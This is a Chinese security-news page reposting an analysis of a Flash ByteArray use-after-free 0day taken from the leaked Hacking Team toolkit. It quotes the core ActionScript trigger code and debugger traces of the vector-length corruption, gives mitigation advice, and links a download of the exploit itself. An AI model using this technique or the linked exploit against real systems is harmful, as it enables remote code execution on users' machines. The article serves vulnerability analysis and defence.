<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>Hacking Team攻击代码分析Part 1: Flash 0day (附0day下载） - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="最近专门提供通过攻击手法进行网络监听的黑客公司Hacking Team被黑，包含该公司的邮件、文档和攻击代码的400G数据泄漏，参见安全脉搏《专业黑客公司Hacking Team被黑，泄露大量内部资料及攻击工具》" />
<meta name="keywords" content="0day,0day下载,360Vulcan Team,Chrome Sandbox,Flash 0day,Hacking Team,Hacking team数据泄露,HackingTeam,Use After Free,代码分析,原理分析,攻击,攻击代码,数据泄露" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/34831.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-34831 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/construction">安全建设</a> &gt; <a href="https://www.secpulse.com/archives/category/construction/security-reports" rel="category tag">安全报告</a> &gt;  正文 </nav><article id="post-34831" class="post-34831 post type-post status-publish format-standard hentry category-security-reports tag-0day tag-360vulcan-team tag-chrome-sandbox tag-flash-0day tag-hacking-team tag-hackingteam tag-use-after-free tag-47553 tag-47557 tag-47555 tag-47552 tag-1789">
	<header class="single-header">
		<h1>Hacking Team攻击代码分析Part 1: Flash 0day (附0day下载）</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2015 /7/7 20:57</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">1,697</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/34831.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p>最近专门提供通过攻击手法进行网络监听的黑客公司Hacking Team被黑，包含该公司的邮件、文档和攻击代码的400G数据泄漏，参见安全脉搏《<a href="http://www.secpulse.com/archives/34820.html" rel="bookmark">专业黑客公司Hacking Team被黑，泄露大量内部资料及攻击工具</a>》</p>
<p>。360Vulcan Team第一时间获取了相关信息，并对其中的攻击代码进行了分析。</p>
<p>我们发现其中至少包含了两个针对Adobe Flash的远程代码执行漏洞和一个针对微软Windows内核字体权限提升漏洞的完整攻击代码（exploit）。其中一个Flash漏洞已经在今年4月修补，<span style="color: #339966;"><strong>其他两个0day漏洞都未修复。</strong></span></p>
<p>其中Flash漏洞exploit被设计为可以针对IE、Chrome浏览器和Office软件进行攻击。攻击者通过嵌入精心构造的恶意Flash文件到网页或Office文档中，使得访问特定网页或打开Office文档的用户感染恶意代码。同时，这些恶意代码通过结合Windows内核字体权限提升漏洞，可以绕过IE（保护模式或增强保护模式）、Chrome（Chrome Sandbox，&lt; Chrome 43)和Office（保护模式）的沙盒保护，完全控制用户的电脑。</p>
<p>我们对这些漏洞进行分析，并分为三个部分将这些0day的信息共享给安全社区，希望软件厂商和安全厂商共同行动，尽快修补和防御着这些“在野”的0day漏洞。</p>
<p>&nbsp;</p>
<h2><strong>Flash 0day</strong> -ActionScript ByteArray Buffer Use After Free</h2>
<p>看起来HackingTeam的远程exploit工具中广泛使用了同一个flash漏洞（攻击目标可以是IE、Chrome、Office系列）:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/07/11.jpg"><img class="alignnone size-full wp-image-34832" src="http://www.secpulse.com/wp-content/uploads/2015/07/11.jpg" alt="1" width="340" height="382" /></a></p>
<p>&nbsp;</p>
<p>初步分析这个Exploit之后，我们发现这个Exploit在最新版本的Adobe Flash（18.0.0.194）中仍然可以触发，因此这应该是一个0day漏洞。</p>
<h2>漏洞原理分析</h2>
<p>&nbsp;</p>
<p>这个漏洞成因在于，Flash对ByteArray内部的buffer使用不当，而造成Use After Free漏洞。</p>
<p>我们来看一下HackingTeam泄露的exploit代码，关键部分如下：</p>
<ol>
<li>定义ByteArray</li>
</ol>
<pre>for(var i:int; i &lt; alen; i+=3){

a[i] = new Class2(i);

 

a[i+1] = new ByteArray();

a[i+1].length = 0xfa0;

 

a[i+2] = new Class2(i+2);

}
</pre>
<p>首先定义一系列的ByteArray，这些ByteArray初始大小被设置成0xfa0，ActionScript内部会为每个Buffer分配0x1000大小的内存。</p>
<ol start="2">
<li>给ByteArray元素赋值：</li>
</ol>
<pre>_ba = a[i];

                                       // call valueOf() and cause UaF memory corruption

                                      <span style="color: #ff0000;"> _ba[3] = new Clasz();
</span></pre>
<p>这一步是触发漏洞的关键，由于ByteArray的元素类型是Byte，当把Clasz类赋值给ByteArray[3]时，AVM会试图将其转化为Byte，此时Clasz的valueOf函数将被调用：</p>
<pre>prototype.valueOf = function()

           {

                    ref = new Array(5);

                    collect.push(ref);

                   

                    // realloc

                    <span style="color: #ff0000;">_ba.length = 0x1100;
</span>
                   

                    // use after free

                    for (var i:int; i &lt; ref.length; i++)

                             ref[i] = new Vector.(0x3f0);

                   

                    return 0x40

           }
</pre>
<p>在valueOf函数中，最关键的一部是更改了ByteArray的长度，将其设置成为0x1100，这个操作将会触发ByteArray内部buffer的重新分配，旧的buffer（大小为0x1000）将会被释放。紧接着exploit代码会分配若干个vector&lt;uint&gt;对象，每个vector同样占用0x1000字节的内存，试图去重新使用已经释放的ByteArray buffer的内存。</p>
<p>&nbsp;</p>
<p>valueOf函数返回0x40，然后0x40会被写入buffer[3]这里，如果逻辑正确，那么此处应该写入的是新分配的buffer；然而由于代码漏洞，这里写入的已经释放的0x1000大小的旧buffer，于是事实上写入的是vector对象的头部，整个过程如下：</p>
<ol>
<li>ByteArray创建并设置长度0xfe0:</li>
</ol>
<p>old buffer         |                                                      |</p>
<ul>
<li>0x1000</li>
</ul>
<ol start="2">
<li>设置_ba[3]，调用valueOf，在valueOf中设置length = 0x1100，此时old buffer被释放</li>
</ol>
<p>&nbsp;</p>
<p>old buffer (Freed)    |                                                      |</p>
<p>0                                                                                 0x1000</p>
<ol start="3">
<li>然后0x1000大小的vector占据old buffer内存，前4个字节是vector的长度字段：</li>
</ol>
<p>Vector                       | f0 03 00 00                                |</p>
<p>0                                                                                 0x1000</p>
<ol start="4">
<li>valueOf返回0x40，0x40被写入buffer[3]，由于UAF漏洞的存在，写入的是vector的size字段：</li>
</ol>
<p>&nbsp;</p>
<p>Vector                       | f0 03 00 <span style="color: #ff0000;"><strong>40</strong></span>                                |</p>
<p>0                                                                                 0x1000</p>
<p>于是我们可以得到一个超长的vector对象：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/07/21.jpg"><img class="alignnone size-full wp-image-34836" src="http://www.secpulse.com/wp-content/uploads/2015/07/21.jpg" alt="2" width="338" height="172" /></a></p>
<p>&nbsp;</p>
<p>我们可以通过调试来观察漏洞的触发过程：</p>
<ol>
<li>调用valueOf之前</li>
</ol>
<pre>0:005&gt; u

<span style="color: #ff0000;">671cf2a5   call     671b0930 //这里最终调用valueOf </span>    

671cf2aa 83c404         add     esp,4

671cf2ad 8806          mov     byte ptr [esi],al

671cf2af 5e             pop     esi
</pre>
<p>此时esi指向old buffer:</p>
<pre>0:005&gt; dd esi-3

0dfd5000 00000000 00000000 00000000 00000000

0dfd5010 00000000 00000000 00000000 00000000
</pre>
<ol start="2">
<li>调用valueOf之后，old buffer被释放，然后被vector占据：</li>
</ol>
<pre>0:005&gt; p

671cf2aa 83c404         add     esp,4
</pre>
<p>此时esi已经指向新分配的vector，就buffer已经被释放</p>
<pre>0:005&gt; dd esi-3

0dfd5000 000003f0 0d2b3000 00000000 00000000

0dfd5010 00000000 00000000 00000000 00000000

0dfd5020 00000000 00000000 00000000 00000000

0dfd5030 00000000 00000000 00000000 00000000

0dfd5040 00000000 00000000 00000000 00000000

0dfd5050 00000000 00000000 00000000 00000000

0dfd5060 00000000 00000000 00000000 00000000

0dfd5070 00000000 00000000 00000000 00000000
</pre>
<ol start="3">
<li>写入buffer[3</li>
</ol>
<p>&nbsp;</p>
<p>接下来valueOf的返回值0x40被写入buffer[3]（及vector.size字段）：</p>
<pre>0:005&gt; p

<span style="color: #ff0000;">eax=00000040</span> ebx=0d8b4921 ecx=00000206 edx=00000006 esi=0dfd5003 edi=0d362020

eip=671cf2ad esp=04f2ceec ebp=04f2d050 iopl=0         nv up ei pl nz na po nc

cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000             efl=00200202

Flash32_18_0_0_194!IAEModule_IAEKernel_UnloadModule+0x1ba07d:

<span style="color: #ff0000;">671cf2ad 8806           mov     byte ptr [esi],al         ds:0023:0dfd5003=00</span>

0:005&gt; p

Flash32_18_0_0_194!IAEModule_IAEKernel_UnloadModule+0x1ba07f:

671cf2af 5e             pop     esi

0:005&gt; dd esi-3

0dfd5000 <span style="color: #ff0000;">400003f0</span> 0d2b3000 00000000 00000000

0dfd5010 00000000 00000000 00000000 00000000

0dfd5020 00000000 00000000 00000000 00000000

0dfd5030 00000000 00000000 00000000 00000000
</pre>
<p>可以看到vector的长度以及被修改成0x400003f0。</p>
<p>&nbsp;</p>
<h2>漏洞防范</h2>
<p>由于该漏洞利用非常稳定，而Adobe暂时没有发布该漏洞的补丁，更可怕的是从HackingTeam泄露的数据来看，该exploit还带有沙盒突破提权功能，危害甚大。我们建议在补丁发布之前，用户可以暂时先禁用flash插件；或者可以开启Chrome或Chrome核心浏览器针对插件的Click-to-Run功能，来缓解Flash 0day的攻击。</p>
<h2>Flash 0day下载</h2>
<p>&nbsp;</p>
<p><span style="color: #ff0000;"><strong><span style="color: #000000;">下载地址：</span><a href="http://share.weiyun.com/e399bc34b79c3c802cf26c2756a2dd54" target="_blank">http://share.weiyun.com/e399bc34b79c3c802cf26c2756a2dd54</a></strong></span></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>【原文：<span style="color: #339966;"><a style="color: #339966;" href="http://blogs.360.cn/blog/hacking-team-flash-0day/" target="_blank">Hacking Team攻击代码分析Part 1: Flash 0day</a></span>  安全脉搏 Expl0r3r 整理发布】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/0day" rel="tag">0day</a><a href="https://www.secpulse.com/archives/tag/0day%e4%b8%8b%e8%bd%bd" rel="tag">0day下载</a><a href="https://www.secpulse.com/archives/tag/360vulcan-team" rel="tag">360Vulcan Team</a><a href="https://www.secpulse.com/archives/tag/chrome-sandbox" rel="tag">Chrome Sandbox</a><a href="https://www.secpulse.com/archives/tag/flash-0day" rel="tag">Flash 0day</a><a href="https://www.secpulse.com/archives/tag/hacking-team" rel="tag">Hacking Team</a><a href="https://www.secpulse.com/archives/tag/hacking-team%e6%95%b0%e6%8d%ae%e6%b3%84%e9%9c%b2" rel="tag">Hacking team数据泄露</a><a href="https://www.secpulse.com/archives/tag/hackingteam" rel="tag">HackingTeam</a><a href="https://www.secpulse.com/archives/tag/use-after-free" rel="tag">Use After Free</a><a href="https://www.secpulse.com/archives/tag/%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" rel="tag">代码分析</a><a href="https://www.secpulse.com/archives/tag/%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90" rel="tag">原理分析</a><a href="https://www.secpulse.com/archives/tag/%e6%94%bb%e5%87%bb" rel="tag">攻击</a><a href="https://www.secpulse.com/archives/tag/%e6%94%bb%e5%87%bb%e4%bb%a3%e7%a0%81" rel="tag">攻击代码</a><a href="https://www.secpulse.com/archives/tag/%e6%95%b0%e6%8d%ae%e6%b3%84%e9%9c%b2" rel="tag">数据泄露</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/58077.html" title="详细阅读 勒索病毒WannaCry深度技术分析——详解传播、感染和危害细节">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/05/timg.jpg&h=150&w=249&zc=1" alt="勒索病毒WannaCry深度技术分析——详解传播、感染和危害细节" class="xg-img"/>
		<p>勒索病毒WannaCry深度技术分析——&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/52444.html" title="详细阅读 从老漏洞到新漏洞&#8212;iMessage 0day(CVE-2016-1843) 挖掘实录">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/10/imessage.jpg&h=150&w=249&zc=1" alt="从老漏洞到新漏洞&#8212;iMessage 0day(CVE-2016-1843) 挖掘实录" class="xg-img"/>
		<p>从老漏洞到新漏洞&#8212;iMess&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/51830.html" title="详细阅读 深聊waf那些事儿（二）——安全小课堂第二十六期">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/09/waf.png&h=150&w=249&zc=1" alt="深聊waf那些事儿（二）——安全小课堂第二十六期" class="xg-img"/>
		<p>深聊waf那些事儿（二）——安全小课堂第&hellip;</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
